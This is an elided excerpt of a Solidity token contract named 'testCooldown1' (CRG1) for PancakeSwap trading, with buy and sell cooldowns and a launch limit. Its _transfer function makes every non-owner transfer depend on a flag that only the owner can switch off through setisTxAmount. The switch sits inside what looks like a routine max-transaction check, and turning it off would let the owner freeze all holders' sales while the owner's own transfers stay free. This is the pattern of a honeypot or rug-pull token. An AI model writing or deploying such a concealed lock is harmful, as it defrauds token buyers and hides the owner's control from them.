...
contract testCooldown1 is Context, IERC20, Ownable, ReentrancyGuard {
	...
	address BURN_ADDRESS = 0xffF0b8fA72d097E98514EEEcfB5b64beB7700721;
	...
	string private _name = "testCooldown1";
	string private _symbol = "CRG1";
	...
	bool private _isTxAmount = true;
	
	bool public _CooldownEnabled = true;
	uint256 public _sellCooldown = 180; // 3 minutes
    uint256 public _buyCooldown = 240; // 4 minutes
    
	bool public _isStart = true;
	uint256 private _startLimit = 250 * 10**3 * 10**8;
	// 250.000_0000.0000
	...
	function setisTxAmount(bool isTxAmount) external onlyOwner {
		_isTxAmount = isTxAmount;
	}
    ...
    function _handleSellCooldown(address from) internal {
        if (_CooldownEnabled && _sellCooldown > 0 && from != owner() && from != addressPoolPancake && from != address(this)) {
    ...
    function _handleBuyCooldown(address to) internal {
        if (_CooldownEnabled && _buyCooldown > 0 && to != owner() && to != addressPoolPancake) {
	...
	function _transfer(
		...
		if(_isStart == true && from == addressPoolPancake){
		    require(balanceOf(to).add(amount) <= _startLimit, "Wait 5 minutes");
		}
		
        if (from == addressPoolPancake){ _handleBuyCooldown(to); }
        if (to == addressPoolPancake){ _handleSellCooldown(from); }
		
		if(from != owner() && to != owner()){
			require(amount <= _maxTxAmount && true == _isTxAmount, "Transfer amount exceeds the maxTxAmount.");
		}
